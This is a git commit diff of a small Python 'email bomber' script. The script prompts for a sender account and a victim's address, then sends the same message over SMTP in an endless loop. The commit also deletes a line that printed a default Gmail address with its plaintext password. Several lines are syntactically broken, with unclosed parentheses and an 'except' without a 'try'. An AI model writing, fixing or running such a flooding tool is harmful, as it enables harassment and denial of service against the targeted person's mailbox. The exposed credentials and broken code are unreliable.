ed876e50860c05323bd1d064ac9d937e7645a599
hamzajaradatlol <47142963+hamzajaradatlol@users.noreply.github.com>
2020-01-12 16:12:03 +0200

    Changed name, deleted some code

--- emailb0mbs.py
+++ emailb0mbs.py
@@ -1,6 +1,5 @@
 import  smtplib
 from colorama import Fore
-print(Fore.GREEN + "Default email: emailbombs0@gmail.com. Password: emailbombs@123
 ymail = input(Fore.RED + "Please write down your email: ")
 rmail = input("Please write down the victim's email: ")
 passwd = input(str("Please write down your password: ")
@@ -12,5 +11,3 @@ print (Fore.GREEN + "[*] You logged in Successfully")
 while True:
     server.sendmail(ymail, rmail, message)
     print (Fore.CYAN + "[===>] Email sent to: ", rmail)
-    except SMTPAuthenticationError:
-       print(Fore.RED + "ERROR [!]")
